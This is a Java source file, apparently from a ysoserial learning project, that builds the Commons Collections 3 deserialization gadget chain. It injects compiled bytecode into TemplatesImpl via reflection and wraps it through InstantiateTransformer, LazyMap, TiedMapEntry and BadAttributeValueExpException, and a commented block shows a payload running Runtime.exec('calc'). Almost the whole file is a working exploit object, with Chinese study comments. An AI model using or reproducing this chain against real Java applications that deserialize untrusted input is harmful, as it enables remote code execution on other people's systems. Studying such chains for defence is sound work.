package org.example;

import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import javax.xml.transform.Templates;
import javax.xml.transform.TransformerConfigurationException;
import java.io.IOException;
import java.lang.reflect.Field;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.HashMap;
import java.util.Map;

public class CC3 {
    public static Object getobject() throws NoSuchFieldException, IllegalAccessException, IOException, TransformerConfigurationException {
        TemplatesImpl templatesImpl = new TemplatesImpl();
        /*反射设置 bytecodes
        // 需要字节码赋值给bytecodes
        ClassPool pool = ClassPool.getDefault();
        // 1. 创建一个空类
        CtClass parentClass = pool.makeClass("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet");
        // 创建一个新的子类，并设置其继承关系
        CtClass clazz = pool.makeClass("com.example.Calc");
        clazz.setSuperclass(parentClass);


        // 4. 添加无参的构造函数
        CtConstructor cons = new CtConstructor(new CtClass[]{}, clazz);
        cons.setBody("Runtime.getRuntime().exec(\"calc\");");
        clazz.addConstructor(cons);
        clazz.writeFile("H:\\代码审计\\ysoserial_learning\\src\\main\\java\\Calc.class");

        //Object person = clazz.toClass().newInstance();
        */
        //final byte[] classBytes = clazz.toBytecode();
        //byte[] classBytes= Files.readAllBytes(Paths.get("H:\\代码审计\\ysoserial_learning\\src\\main\\java\\Calc.class\\com\\example\\Calc.class"));

        byte[] classBytes = Files.readAllBytes(Paths.get("H:\\代码审计\\ysoserial_learning\\target\\classes\\org\\example\\Calc.class"));
        byte[][] bytecodes={classBytes};



        Field bytecodes_ = templatesImpl.getClass().getDeclaredField("_bytecodes");
        bytecodes_.setAccessible(true);
        bytecodes_.set(templatesImpl,bytecodes);

        //templatesImpl.defineTransletClasses();这个被下面调用
        //但是要设置_name,_class,用反射的方法
        //反射设置_name private String _name = null;
        Field name = templatesImpl.getClass().getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templatesImpl,"aaaa");

        //反射设置_class private Class[] _class = null;
        Field class_ = templatesImpl.getClass().getDeclaredField("_class");
        class_.setAccessible(true);
        class_.set(templatesImpl,null);

        //反射设置"_tfactory", transFactory.newInstance()

        Field tfactory = templatesImpl.getClass().getDeclaredField("_tfactory");
        tfactory.setAccessible(true);
        tfactory.set(templatesImpl,new TransformerFactoryImpl());

        //templatesImpl.newTransformer();
        //templatesImpl.getOutputProperties();

        // TrAXFilter
        // TrAXFilter trAXFilter= new TrAXFilter(templatesImpl);

        // InstantiateTransformer
        InstantiateTransformer  instantiateTransformer = new InstantiateTransformer(new Class[] {Templates.class},new Object[]{templatesImpl});
        // instantiateTransformer.transform(TrAXFilter.class);



        // 调用LazyMap的get方法
        Map map = new HashMap();
        Map lazymap = LazyMap.decorate(map,instantiateTransformer);
        //lazymap.get(1);

        //TiedMapEntry的tostring方法
        TiedMapEntry tiedmapentry = new TiedMapEntry(lazymap,TrAXFilter.class);
        //tiedmapentry.toString();

        //BadAttributeValueExpException的readObject
        //BadAttributeValueExpException object = new BadAttributeValueExpException(tiedmapentry);
        //Object object = lazymap;

        BadAttributeValueExpException object = new BadAttributeValueExpException(null);
        Field valfield = object.getClass().getDeclaredField("val");
        //AccessibleObject Reflections;
        valfield.setAccessible(true);
        valfield.set(object, tiedmapentry);

        return object;


    }
}
